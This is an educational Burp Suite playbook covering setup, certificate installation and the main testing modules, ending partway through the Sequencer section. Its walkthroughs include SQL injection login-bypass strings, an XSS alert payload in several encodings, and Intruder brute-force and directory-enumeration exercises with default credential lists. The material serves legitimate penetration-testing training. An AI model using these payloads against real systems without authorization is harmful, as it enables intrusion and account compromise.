# Burp Suite Playbook

A comprehensive, hands-on guide for cybersecurity learners and professionals preparing for certifications like CEH Practical, OSCP, or working as penetration testers.

---

## ⚠️ Legal Disclaimer & Ethical Notice

> **IMPORTANT**: This playbook is intended **exclusively for authorized security testing, educational purposes, and legitimate penetration testing engagements**.
>
> Before using Burp Suite against any target:
> - Obtain **explicit written authorization** from the system owner
> - Define a clear **scope of engagement**
> - Understand applicable **laws and regulations** (CFAA, Computer Misuse Act, GDPR, etc.)
> - Use only against **systems you own** or have **permission to test**
>
> Unauthorized testing of web applications is illegal and unethical. Practice on intentionally vulnerable applications like DVWA, OWASP WebGoat, PortSwigger Web Security Academy, or TryHackMe labs.
>
> **The author assumes no liability for misuse of this information.**

---

## Table of Contents

1. [Introduction to Burp Suite](#introduction-to-burp-suite)
2. [Installation and Setup](#installation-and-setup)
3. [Understanding the Interface](#understanding-the-interface)
4. [Core Modules Deep Dive](#core-modules-deep-dive)
   - [Proxy](#proxy)
   - [Target](#target)
   - [Repeater](#repeater)
   - [Intruder](#intruder)
   - [Decoder](#decoder)
   - [Comparer](#comparer)
   - [Sequencer](#sequencer)
   - [Logger](#logger)
   - [Organizer](#organizer)
5. [Extensions and BApp Store](#extensions-and-bapp-store)
6. [Practical Exercises](#practical-exercises)
7. [Common Vulnerability Testing](#common-vulnerability-testing)
8. [Advanced Techniques](#advanced-techniques)
9. [Best Practices](#best-practices)
10. [Troubleshooting](#troubleshooting)
11. [Quick Reference](#quick-reference)
12. [Additional Resources](#additional-resources)

---

## Introduction to Burp Suite

### What is Burp Suite?

Burp Suite is the industry-standard toolkit for web application security testing, developed by PortSwigger. It functions as an **intercepting proxy** that sits between your browser and target web applications, allowing you to inspect, modify, and replay HTTP/HTTPS traffic.

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│              │     │              │     │              │
│   Browser    │────▶│  Burp Suite  │────▶│  Target Web  │
│              │     │   (Proxy)    │     │  Application │
│              │◀────│              │◀────│              │
└──────────────┘     └──────────────┘     └──────────────┘
                            │
                            ▼
                     ┌──────────────┐
                     │   Analysis   │
                     │   & Attack   │
                     │    Tools     │
                     └──────────────┘
```

### Editions Comparison

| Feature | Community (Free) | Professional | Enterprise |
|---------|------------------|--------------|------------|
| Manual Testing Tools | ✅ Full | ✅ Full | ✅ Full |
| Intercepting Proxy | ✅ Full | ✅ Full | ✅ Full |
| Repeater | ✅ Full | ✅ Full | ✅ Full |
| Decoder | ✅ Full | ✅ Full | ✅ Full |
| Comparer | ✅ Full | ✅ Full | ✅ Full |
| Sequencer | ✅ Full | ✅ Full | ✅ Full |
| Intruder | ⚠️ Rate-limited | ✅ Full speed | ✅ Full speed |
| Scanner | ❌ None | ✅ Full | ✅ Full + CI/CD |
| Extensions | ✅ Basic | ✅ Full | ✅ Full |
| Project Files | ❌ None | ✅ Full | ✅ Full |
| Collaborator | ❌ None | ✅ Full | ✅ Full |
| Price | Free | ~$449/year | Enterprise pricing |

### Primary Use Cases

1. **Manual Penetration Testing** — Intercept and manipulate requests to discover vulnerabilities
2. **Automated Scanning** — Discover common web vulnerabilities automatically (Professional)
3. **API Testing** — Test REST, GraphQL, and SOAP APIs for security issues
4. **Session Analysis** — Examine authentication and session management
5. **Input Validation Testing** — Test for injection vulnerabilities
6. **Business Logic Testing** — Identify flaws in application workflows
7. **Bug Bounty Hunting** — Find vulnerabilities in authorized programs

---

## Installation and Setup

### System Requirements

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| RAM | 4 GB | 8+ GB |
| Disk Space | 500 MB | 2+ GB |
| Java | Bundled (Burp includes JRE) | — |
| OS | Windows 8+, macOS 10.14+, Linux | Latest versions |

### Installation by Operating System

#### Windows Installation

```powershell
# Method 1: Official Installer (Recommended)
# 1. Download from https://portswigger.net/burp/releases
# 2. Run the installer: burpsuite_pro_windows-x64_vX_X_X.exe
# 3. Follow the installation wizard
# 4. Launch from Start Menu or Desktop shortcut

# Method 2: Standalone JAR (portable)
# 1. Download the JAR file from PortSwigger
# 2. Run with:
java -jar -Xmx4g burpsuite_pro_vX.X.X.jar

# Increase memory allocation for large projects:
java -jar -Xmx8g burpsuite_pro_vX.X.X.jar
```

**Windows Defender Exclusion (Recommended)**:
```powershell
# Add exclusion for Burp Suite directory to prevent performance issues
Add-MpExclusion -Path "C:\Program Files\BurpSuitePro"
```

#### Linux Installation

```bash
# Method 1: Official Installer (Recommended)
# Download the .sh installer from PortSwigger
chmod +x burpsuite_pro_linux_vX_X_X.sh
./burpsuite_pro_linux_vX_X_X.sh

# Launch Burp Suite
/opt/BurpSuitePro/BurpSuitePro

# Method 2: Kali Linux (Pre-installed)
# Burp Suite Community is pre-installed on Kali
burpsuite

# Update to latest version on Kali
sudo apt update && sudo apt install burpsuite

# Method 3: Standalone JAR
java -jar -Xmx4g burpsuite_pro.jar

# Create desktop launcher
cat > ~/.local/share/applications/burpsuite.desktop << EOF
[Desktop Entry]
Name=Burp Suite Professional
Exec=/opt/BurpSuitePro/BurpSuitePro
Icon=/opt/BurpSuitePro/icon.png
Type=Application
Categories=Security;Network;
EOF
```

#### macOS Installation

```bash
# Method 1: Official DMG Installer (Recommended)
# 1. Download .dmg from https://portswigger.net/burp/releases
# 2. Open DMG and drag to Applications folder
# 3. First launch: Right-click > Open (bypass Gatekeeper)

# Method 2: Homebrew
brew install --cask burp-suite
# or for Professional:
brew install --cask burp-suite-professional

# Method 3: Standalone JAR
java -jar -Xmx4g burpsuite_pro.jar

# Grant necessary permissions in System Preferences:
# Security & Privacy > Privacy > Full Disk Access (optional)
```

### Initial Configuration

#### First Launch Setup

1. **License Activation** (Professional only):
   - Enter license key when prompted
   - Activate online or offline

2. **Project Selection**:
   - **Temporary Project**: Data lost on close (Community edition only option)
   - **New Project on Disk**: Persistent storage (Professional)
   - **Open Existing Project**: Resume previous work

3. **Configuration Selection**:
   - **Use Burp Defaults**: Standard settings
   - **Load from Configuration File**: Import custom settings

#### Memory Configuration

For large-scale testing, increase Java heap size:

```bash
# Edit the Burp Suite configuration or launch script
# Linux/macOS: /opt/BurpSuitePro/BurpSuitePro.vmoptions
# Windows: C:\Program Files\BurpSuitePro\BurpSuitePro.vmoptions

# Recommended settings for 16GB RAM system:
-Xms2g
-Xmx8g
-XX:MaxPermSize=512m
```

### Browser Configuration

#### Firefox Setup (Recommended)

Firefox is preferred due to its independent proxy settings and FoxyProxy extension.

**Method 1: Manual Configuration**

1. Open Firefox Settings (about:preferences)
2. Scroll to **Network Settings** > **Settings**
3. Select **Manual proxy configuration**
4. Configure:
   ```
   HTTP Proxy: 127.0.0.1    Port: 8080
   ✅ Also use this proxy for HTTPS
   ```
5. Click **OK**

**Method 2: FoxyProxy Extension (Recommended)**

```
1. Install FoxyProxy Standard from Firefox Add-ons
2. Click FoxyProxy icon > Options
3. Add new proxy:
   - Title: Burp Suite
   - Proxy Type: HTTP
   - Proxy IP: 127.0.0.1
   - Port: 8080
4. Save and select "Burp Suite" profile when testing
```

#### Chrome Setup

**Method 1: System Proxy** (affects all applications)

```bash
# Windows: Internet Options > Connections > LAN Settings
# Linux: System Settings > Network > Proxy
# macOS: System Preferences > Network > Advanced > Proxies
```

**Method 2: Chrome with Proxy Flag**

```bash
# Launch Chrome with specific proxy
# Windows
"C:\Program Files\Google\Chrome\Application\chrome.exe" --proxy-server="127.0.0.1:8080"

# Linux
google-chrome --proxy-server="127.0.0.1:8080"

# macOS
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --proxy-server="127.0.0.1:8080"
```

**Method 3: SwitchyOmega Extension**

Similar to FoxyProxy, allows quick proxy switching in Chrome.

#### Burp's Built-in Browser

Burp Suite includes a Chromium-based browser pre-configured to use Burp's proxy:

1. Navigate to **Proxy** > **Intercept**
2. Click **Open browser**
3. Browser launches with proxy pre-configured and CA certificate installed

### Installing the CA Certificate

To intercept HTTPS traffic, browsers must trust Burp's CA certificate.

#### Export the Certificate

1. With Burp running and proxy listener active
2. Navigate to `http://burpsuite` or `http://127.0.0.1:8080` in your proxied browser
3. Click **CA Certificate** to download `cacert.der`

#### Firefox Import

```
1. Open Firefox Settings (about:preferences)
2. Search for "Certificates"
3. Click "View Certificates"
4. Go to "Authorities" tab
5. Click "Import"
6. Select cacert.der
7. Check "Trust this CA to identify websites"
8. Click OK
```

#### Chrome/System Import (Windows)

```powershell
# Method 1: GUI
# 1. Double-click cacert.der
# 2. Click "Install Certificate"
# 3. Select "Local Machine" or "Current User"
# 4. Choose "Place all certificates in the following store"
# 5. Browse > "Trusted Root Certification Authorities"
# 6. Finish

# Method 2: Command Line (Admin)
certutil -addstore -f "ROOT" cacert.der
```

#### Chrome/System Import (macOS)

```bash
# Method 1: GUI
# 1. Double-click cacert.der
# 2. Keychain Access opens
# 3. Add to "System" keychain
# 4. Find "PortSwigger CA" in certificates
# 5. Double-click > Trust > "Always Trust"

# Method 2: Command Line
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain cacert.der
```

#### Linux Import (System-wide)

```bash
# Debian/Ubuntu
sudo cp cacert.der /usr/local/share/ca-certificates/burp-ca.crt
sudo update-ca-certificates

# RHEL/CentOS/Fedora
sudo cp cacert.der /etc/pki/ca-trust/source/anchors/burp-ca.crt
sudo update-ca-trust

# Firefox on Linux (separate certificate store)
# Must import via Firefox certificate manager as described above
```

### Verifying Setup

1. **Start Burp Suite** and ensure proxy listener is running on `127.0.0.1:8080`
2. **Configure browser** to use proxy
3. **Navigate to any HTTPS site** (e.g., https://example.com)
4. **Check Burp's HTTP History** — you should see the request
5. **Verify no certificate errors** in browser

```
✅ Setup Complete Checklist:
[ ] Burp Suite installed and running
[ ] Proxy listener active on 127.0.0.1:8080
[ ] Browser configured to use proxy
[ ] CA certificate installed and trusted
[ ] HTTPS traffic visible in HTTP History
[ ] No certificate warnings in browser
```

---

## Understanding the Interface

### Main Interface Layout

```
┌─────────────────────────────────────────────────────────────────────┐
│  File  Edit  View  Project  Proxy  Repeater  Intruder  Window  Help│
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌────────┬────────┬────────┬────────┬────────┬────────┬────────┐  │
│  │Dashboard│ Target │  Proxy │Repeater│Intruder│ Decoder│  More  │  │
│  └────────┴────────┴────────┴────────┴────────┴────────┴────────┘  │
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                                                               │  │
│  │                      Module Content Area                      │  │
│  │                                                               │  │
│  │  (Each tab has its own interface and sub-tabs)               │  │
│  │                                                               │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                      │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  Event Log / Task Status                                      │  │
│  └──────────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

### Navigation Tips

| Shortcut | Action |
|----------|--------|
| `Ctrl+Shift+P` | Go to Proxy > Intercept |
| `Ctrl+Shift+R` | Send to Repeater |
| `Ctrl+Shift+I` | Send to Intruder |
| `Ctrl+R` | Send to Repeater (from request) |
| `Ctrl+I` | Send to Intruder (from request) |
| `Ctrl+D` | Send to Decoder |
| `Ctrl+Shift+D` | Go to Dashboard |
| `Ctrl+Shift+T` | Go to Target |
| `Ctrl+Space` | Forward intercepted request |
| `Ctrl+F` | Find in current view |

### Color Coding

Burp uses colors to indicate request/response characteristics:

| Color | Meaning |
|-------|---------|
| 🔴 Red | Highlighted, interesting, or contains potential vulnerability |
| 🟡 Yellow | Parameterized request |
| 🔵 Blue | Contains cookies |
| 🟢 Green | HTTPS request |
| ⚪ Gray | Non-parameterized or static content |

---

## Core Modules Deep Dive

### Proxy

The **Proxy** module is the heart of Burp Suite. It intercepts HTTP/S traffic between your browser and target applications.

#### Sub-tabs Overview

```
Proxy
├── Intercept      → Real-time request/response interception
├── HTTP History   → Log of all proxied requests
├── WebSockets     → WebSocket message history
└── Options        → Proxy listener and interception settings
```

#### Intercept Tab

The Intercept tab allows you to pause, examine, and modify requests before they reach the server.

**Key Controls:**

| Button | Function |
|--------|----------|
| **Intercept is on/off** | Toggle interception |
| **Forward** | Send request to server |
| **Drop** | Discard request |
| **Action** | Context menu (Send to Repeater, Intruder, etc.) |

**Request Viewer Tabs:**

- **Raw**: Complete HTTP request as text
- **Params**: Parsed parameters (query string, body, cookies)
- **Headers**: HTTP headers only
- **Hex**: Hexadecimal representation

**Example: Intercepting and Modifying a Login Request**

```http
# Original intercepted request
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=test123

# Modified request (changed password)
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

username=admin&password=admin' OR '1'='1
```

#### HTTP History Tab

All proxied requests are logged here for later analysis.

**Filtering Options:**

```
Filter by:
├── Request type (show only in-scope items)
├── MIME type (HTML, JSON, XML, images, etc.)
├── Status code (2xx, 3xx, 4xx, 5xx)
├── Search term (URL, body, headers)
├── File extension (hide .css, .js, .jpg, etc.)
├── Listener port
└── Annotation (highlighted, commented)
```

**Useful Filter Preset for Testing:**

```
✅ Show only in-scope items
✅ Hide images, CSS, JavaScript
✅ Show only parameterized requests
❌ Hide OPTIONS requests
```

#### Proxy Options

**Proxy Listeners:**

```
Default: 127.0.0.1:8080

Additional listeners for special cases:
- All interfaces (0.0.0.0:8080) for mobile testing
- Different ports for multiple test instances
- Invisible proxying for non-proxy-aware clients
```

**Interception Rules:**

Configure what gets intercepted:

```
# Example: Only intercept requests to target domain
Rule 1: AND
  - URL: Contains "target-domain.com"
  - Method: Is not in list (OPTIONS, CONNECT)

# Example: Intercept specific file types
Rule 2: OR
  - File extension: Matches (php, asp, aspx, jsp)
```

**Match and Replace Rules:**

Automatically modify requests/responses:

```
# Example rules:
1. Replace "User-Agent" header with custom value
2. Add "X-Forwarded-For: 127.0.0.1" header
3. Remove "Cookie" header for testing unauthenticated access
4. Replace response body text for testing
```

#### Practical Exercise: Basic Interception

**Objective**: Intercept a form submission and modify the data.

**Steps**:

1. **Set up target**: Navigate to a test application (DVWA, WebGoat, etc.)

2. **Enable interception**:
   ```
   Proxy > Intercept > "Intercept is on"
   ```

3. **Submit a form** in your browser (e.g., login form)

4. **Examine the intercepted request**:
   ```http
   POST /dvwa/login.php HTTP/1.1
   Host: localhost
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=password&Login=Login
   ```

5. **Modify the request** (e.g., add SQL injection payload):
   ```http
   username=admin' OR '1'='1&password=anything&Login=Login
   ```

6. **Click Forward** to send the modified request

7. **Observe the response** in HTTP History or browser

---

### Target

The **Target** module provides a comprehensive view of your target application's structure and content.

#### Sub-tabs Overview

```
Target
├── Site map       → Hierarchical view of discovered content
├── Scope          → Define what's in scope for testing
└── Issue definitions → Reference for vulnerability types
```

#### Site Map

Displays all discovered content in a tree structure:

```
https://target.com
├── /
│   ├── index.php
│   ├── login.php
│   └── dashboard/
│       ├── index.php
│       ├── profile.php
│       └── settings.php
├── /api/
│   ├── v1/
│   │   ├── users
│   │   ├── products
│   │   └── orders
│   └── v2/
└── /static/
    ├── css/
    ├── js/
    └── images/
```

**Site Map Features:**

| Feature | Description |
|---------|-------------|
| Contents | View requests/responses for each item |
| Issues | See vulnerabilities found by Scanner |
| Compare | Compare site maps between scans |
| Filter | Show only items matching criteria |

#### Scope Configuration

Defining scope is **critical** for focused testing and avoiding accidental attacks on out-of-scope systems.

**Adding Items to Scope:**

```
Method 1: Right-click in Site Map > "Add to scope"
Method 2: Target > Scope > "Add" button
Method 3: Right-click request in HTTP History > "Add to scope"
```

**Scope Definition Example:**

```
Include in scope:
  Protocol: Any
  Host: ^target\.com$
  Port: Any
  File: ^/app/.*

Exclude from scope:
  Protocol: Any
  Host: ^target\.com$
  Port: Any
  File: ^/app/logout.*
```

**Scope Regex Examples:**

```regex
# Match specific domain and subdomains
^.*\.target\.com$

# Match specific path prefix
^/api/v[12]/.*$

# Exclude certain file types
^.*(?<!\.js)(?<!\.css)(?<!\.png)$

# Match only dynamic pages
^.*\.(php|asp|aspx|jsp)$
```

#### Practical Exercise: Mapping an Application

**Objective**: Create a comprehensive site map of a target application.

**Steps**:

1. **Add target to scope**:
   ```
   Target > Scope > Add > Host: localhost (or target domain)
   ```

2. **Configure proxy to capture only in-scope traffic**:
   ```
   Proxy > Options > Intercept Client Requests
   ✅ "And URL is in target scope"
   ```

3. **Manually browse the application**:
   - Click every link
   - Submit every form
   - Navigate to all visible pages
   - Check robots.txt, sitemap.xml

4. **Review Site Map**:
   - Expand all folders
   - Look for interesting endpoints
   - Note parameters and file types

5. **Analyze discovered content**:
   ```
   Right-click site node > "Engagement tools" > "Find comments"
   Right-click site node > "Engagement tools" > "Find scripts"
   Right-click site node > "Engagement tools" > "Find references"
   ```

---

### Repeater

The **Repeater** module allows you to manually modify and resend individual requests, making it ideal for:
- Testing specific vulnerabilities
- Understanding application behavior
- Crafting precise payloads
- Iterative testing

#### Interface Layout

```
┌─────────────────────────────────────────────────────────────────────┐
│  [1] [2] [3] [+]                                          Send    │
├─────────────────────────────────────────────────────────────────────┤
│                    Request                                          │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │ POST /api/login HTTP/1.1                                     │   │
│  │ Host: target.com                                             │   │
│  │ Content-Type: application/json                               │   │
│  │                                                              │   │
│  │ {"username":"admin","password":"test"}                       │   │
│  └─────────────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────────────┤
│                    Response                                         │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │ HTTP/1.1 401 Unauthorized                                    │   │
│  │ Content-Type: application/json                               │   │
│  │                                                              │   │
│  │ {"error":"Invalid credentials"}                              │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

#### Key Features

| Feature | Description |
|---------|-------------|
| **Multiple tabs** | Work on multiple requests simultaneously |
| **Request history** | Navigate through previous modifications |
| **Auto-update Content-Length** | Automatically recalculates header |
| **Follow redirects** | Option to follow 3xx responses |
| **Render response** | View HTML responses rendered |

#### Sending Requests to Repeater

```
From Proxy HTTP History:
  - Right-click > "Send to Repeater" (or Ctrl+R)

From Site Map:
  - Right-click request > "Send to Repeater"

From Intruder:
  - Right-click > "Send to Repeater"

From any request viewer:
  - Ctrl+R keyboard shortcut
```

#### Practical Exercise: Testing for SQL Injection with Repeater

**Objective**: Use Repeater to test a login form for SQL injection.

**Steps**:

1. **Capture a login request** in Proxy:
   ```http
   POST /login HTTP/1.1
   Host: vulnerable-app.com
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=test
   ```

2. **Send to Repeater** (Ctrl+R)

3. **Test normal response** — Click **Send**:
   ```http
   HTTP/1.1 401 Unauthorized
   
   {"message":"Invalid username or password"}
   ```

4. **Test for SQL injection** — Modify username:
   ```http
   username=admin'&password=test
   ```
   
   **Response** (if vulnerable):
   ```http
   HTTP/1.1 500 Internal Server Error
   
   Error: SQL syntax error near "'"
   ```

5. **Craft exploitation payload**:
   ```http
   username=admin' OR '1'='1' -- &password=anything
   ```
   
   **Response** (successful bypass):
   ```http
   HTTP/1.1 200 OK
   Set-Cookie: session=abc123...
   
   {"message":"Login successful","user":"admin"}
   ```

6. **Document findings**:
   - Right-click > "Add comment"
   - Note: "SQL Injection - Authentication Bypass"

#### Repeater Tips

```
1. Use descriptive tab names:
   - Right-click tab > "Rename tab"
   - Name: "SQLi-Login", "XSS-Search", etc.

2. Compare responses:
   - Select two tabs
   - Right-click > "Compare responses"
   - Or send both to Comparer

3. Change request method:
   - Right-click > "Change request method"
   - Useful for testing GET vs POST handling

4. Encode/Decode payloads:
   - Select text > Right-click > "Convert selection"
   - URL-encode, Base64, HTML entities, etc.
```

---

### Intruder

The **Intruder** module is Burp's tool for automated customized attacks. It's used for:
- Brute force attacks
- Fuzzing parameters
- Enumerating resources
- Testing for vulnerabilities at scale

> ⚠️ **Note**: Intruder is rate-limited in Community edition. Professional edition provides full speed.

#### Sub-tabs Overview

```
Intruder
├── Positions   → Define where payloads are inserted
├── Payloads    → Configure payload sets
├── Options     → Attack settings and grep rules
└── Resource Pool → Manage concurrent requests (Pro)
```

#### Attack Types

| Type | Description | Use Case |
|------|-------------|----------|
| **Sniper** | Single payload set, one position at a time | Testing individual parameters |
| **Battering Ram** | Same payload in all positions simultaneously | Same value everywhere |
| **Pitchfork** | Multiple payload sets, parallel iteration | Username + password combinations |
| **Cluster Bomb** | Multiple payload sets, all permutations | Comprehensive credential testing |

**Visual Explanation:**

```
Positions: §username§ and §password§
Payloads: Set 1: [admin, user]  Set 2: [pass1, pass2]

Sniper (2 payloads × 2 positions = 4 requests):
  Request 1: admin / [original]
  Request 2: user / [original]
  Request 3: [original] / pass1
  Request 4: [original] / pass2

Battering Ram (2 payloads = 2 requests):
  Request 1: admin / admin
  Request 2: user / user

Pitchfork (2 payloads = 2 requests):
  Request 1: admin / pass1
  Request 2: user / pass2

Cluster Bomb (2 × 2 = 4 requests):
  Request 1: admin / pass1
  Request 2: admin / pass2
  Request 3: user / pass1
  Request 4: user / pass2
```

#### Positions Tab

Define insertion points using the `§` markers:

```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=§admin§&password=§password§
```

**Position Controls:**

| Button | Function |
|--------|----------|
| **Add §** | Add markers around selected text |
| **Clear §** | Remove all position markers |
| **Auto §** | Automatically detect insertion points |
| **Refresh** | Re-calculate positions |

#### Payloads Tab

Configure what values to test at each position.

**Payload Types:**

| Type | Description | Example |
|------|-------------|---------|
| **Simple list** | Static list of values | admin, user, guest |
| **Runtime file** | Load from file | /usr/share/wordlists/rockyou.txt |
| **Numbers** | Sequential or random numbers | 1-1000, step 1 |
| **Dates** | Date sequences | 01/01/2020 to 12/31/2024 |
| **Brute forcer** | Character set permutations | a-z, 4 characters |
| **Null payloads** | Empty payload (for counting) | — |
| **Username generator** | Generate from name list | john.doe, j.doe, jdoe |

**Payload Processing:**

Add rules to transform payloads:

```
1. Add prefix: "admin_" → admin_[payload]
2. Add suffix: "@company.com" → [payload]@company.com
3. Hash: MD5 → 5f4dcc3b5aa765d61d8327deb882cf99
4. URL-encode: admin → admin
5. Base64-encode: admin → YWRtaW4=
```

**Payload Encoding:**

```
✅ URL-encode these characters: [list]
Common setting: Encode special characters for URL safety
```

#### Options Tab

Configure attack behavior and result analysis.

**Request Engine:**

```
Number of threads: 1-100 (Pro only, Community fixed at 1)
Network connection: Standard, reuse, per-connection
Request timing: Throttle, random delays
```

**Grep - Match:**

Flag responses containing specific strings:

```
Examples:
- "Invalid password"     → Failed login attempt
- "Welcome"              → Successful login
- "Error"                → Application error
- "SQL"                  → Potential SQL injection
```

**Grep - Extract:**

Extract specific content from responses:

```
Extract between: <title> and </title>
Extract regex: "user_id":\s*(\d+)
```

**Grep - Payloads:**

Check if payload appears in response (useful for XSS testing).

#### Practical Exercise: Brute Force Login

**Objective**: Use Intruder to brute force a login form.

**Setup**: Have a username list and password list ready.

**Steps**:

1. **Capture login request** and send to Intruder (Ctrl+I):
   ```http
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=password123
   ```

2. **Configure Positions**:
   - Clear all positions: Click **Clear §**
   - Select `admin` → Click **Add §**
   - Select `password123` → Click **Add §**
   - Choose Attack type: **Cluster Bomb**
   
   ```http
   username=§admin§&password=§password123§
   ```

3. **Configure Payloads**:
   
   **Payload Set 1** (usernames):
   ```
   Payload type: Simple list
   Payload options: admin, administrator, root, user, guest
   ```
   
   **Payload Set 2** (passwords):
   ```
   Payload type: Simple list
   Payload options: password, 123456, admin, Password1, qwerty
   ```

4. **Configure Options**:
   
   **Grep - Match**:
   ```
   ✅ Match: "Welcome"
   ✅ Match: "Login successful"
   ❌ Match: "Invalid"
   ```

5. **Start Attack**:
   - Click **Start Attack**
   - Monitor results table

6. **Analyze Results**:
   
   | Request | Payload 1 | Payload 2 | Status | Length | Welcome |
   |---------|-----------|-----------|--------|--------|---------|
   | 1 | admin | password | 401 | 234 | ❌ |
   | 2 | admin | 123456 | 401 | 234 | ❌ |
   | 3 | admin | admin | 200 | 1456 | ✅ |
   | ... | ... | ... | ... | ... | ... |

7. **Identify success**:
   - Sort by Status or Length column
   - Look for ✅ in grep match columns
   - Valid credentials: admin:admin

#### Practical Exercise: Directory Enumeration

**Objective**: Discover hidden directories and files.

**Steps**:

1. **Create base request**:
   ```http
   GET /§FUZZ§ HTTP/1.1
   Host: target.com
   ```

2. **Positions**: Single position marker where directory name goes

3. **Payloads**:
   ```
   Payload type: Simple list or Runtime file
   Load: /usr/share/wordlists/dirb/common.txt
   ```

4. **Options**:
   ```
   Grep - Match:
   ❌ "404"
   ❌ "Not Found"
   
   Grep - Extract:
   Title tag content
   ```

5. **Results Analysis**:
   - Sort by Status code (200, 301, 302, 403)
   - 200: Existing resource
   - 301/302: Redirects (may indicate existing directory)
   - 403: Forbidden (exists but access denied)
   - 404: Does not exist

---

### Decoder

The **Decoder** module provides encoding and decoding functionality for various formats commonly encountered in web testing.

#### Interface

```
┌─────────────────────────────────────────────────────────────────────┐
│  Input Text                                                          │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │ Hello World                                                  │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                      │
│  [Decode as...] [Encode as...] [Hash as...] [Smart decode]          │
│                                                                      │
│  Output                                                              │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │ SGVsbG8gV29ybGQ=                                             │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                      │
│  [Decode as...] [Encode as...] [Hash as...]                         │
│                                                                      │
│  Output 2                                                            │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │ ...                                                          │   │
│  └─────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

#### Supported Formats

**Encoding/Decoding:**

| Format | Example Input | Example Output |
|--------|---------------|----------------|
| URL | Hello World | Hello%20World |
| HTML | &lt;script&gt; | <script> |
| Base64 | Hello | SGVsbG8= |
| ASCII Hex | Hi | 4869 |
| Hex | Hi | \x48\x69 |
| Octal | Hi | \110\151 |
| Binary | A | 01000001 |
| Gzip | [data] | [compressed] |

**Hashing:**

| Algorithm | Example Hash (of "password") |
|-----------|------------------------------|
| MD5 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| SHA-1 | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 |
| SHA-256 | 5e884898da28047d9169... |
| SHA-512 | b109f3bbbc244eb82441... |

#### Smart Decode

The **Smart decode** feature automatically detects and decodes multiple layers:

```
Input: SGVsbG8lMjBXb3JsZA==

Smart Decode:
  Layer 1 (Base64): Hello%20World
  Layer 2 (URL): Hello World
```

#### Practical Use Cases

**1. Decoding JWT Tokens:**

```
Input: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

Decode as Base64:
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"user":"admin"}
```

**2. Crafting XSS Payloads:**

```
Original: <script>alert('XSS')</script>

URL Encode: %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
HTML Encode: &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
Base64: PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

**3. Decoding Obfuscated Parameters:**

```
Parameter value: dXNlcj1hZG1pbiZyb2xlPXN1cGVydXNlcg==

Base64 decode: user=admin&role=superuser

Security finding: Role parameter can be manipulated!
```

---

### Comparer

The **Comparer** module allows you to compare two pieces of data to identify differences, useful for:
- Comparing responses with different inputs
- Identifying changes in application state
- Detecting subtle differences in error messages
- Analyzing race condition results

#### Interface

```
┌─────────────────────────────────────────────────────────────────────┐
│  Item 1                           Item 2                            │
│  ┌────────────────────────────┐   ┌────────────────────────────┐   │
│  │ HTTP/1.1 200 OK            │   │ HTTP/1.1 200 OK            │   │
│  │ Content-Type: text/html    │   │ Content-Type: text/html    │   │
│  │                            │   │                            │   │
│  │ Welcome, admin!            │   │ Welcome, user!             │   │
│  │ Role: administrator        │   │ Role: standard             │   │
│  └────────────────────────────┘   └────────────────────────────┘   │
│                                                                      │
│  [Words] [Bytes]                    Sync views: ✅                  │
│                                                                      │
│  Differences highlighted:                                           │
│  - "admin" vs "user"                                                │
│  - "administrator" vs "standard"                                    │
└─────────────────────────────────────────────────────────────────────┘
```

#### Comparison Modes

| Mode | Description |
|------|-------------|
| **Words** | Compare word-by-word, highlight changed words |
| **Bytes** | Compare byte-by-byte, show exact character differences |

#### Sending Data to Comparer

```
From any request/response:
  Right-click > "Send to Comparer" (request or response)

From Intruder results:
  Select two results > Right-click > "Compare responses"

From Repeater:
  Right-click response > "Send to Comparer"
```

#### Practical Exercise: Comparing Error Messages

**Objective**: Identify differences in error messages that reveal information.

**Steps**:

1. **Send login request with valid username, wrong password**:
   ```http
   POST /login
   username=admin&password=wrong
   ```
   Response: "Invalid password for user admin"

2. **Send login request with invalid username**:
   ```http
   POST /login
   username=nonexistent&password=wrong
   ```
   Response: "User not found"

3. **Send both responses to Comparer**

4. **Analyze**:
   - Different error messages reveal valid usernames
   - Security finding: User enumeration vulnerability

---

### Sequencer

The **Sequencer** module analyzes the quality of randomness in tokens, session IDs, and other security-critical values.

#### Why Sequencer Matters

Weak randomness can lead to:
- Session hijacking (predictable session IDs)
- Token forgery (predictable CSRF tokens)
- Authentication bypass (predictable password reset tokens)

#### Interface

```
Sequencer
├── Live capture    → Capture tokens from repeated requests
├── Manual load     → Analyze pre-captured tokens
└── Analysis options → Configure statistical tests
```

#### How to Use

**1. Live Capture Method:**

```
1. Find a request that returns a token (e.g., Set-Cookie header)
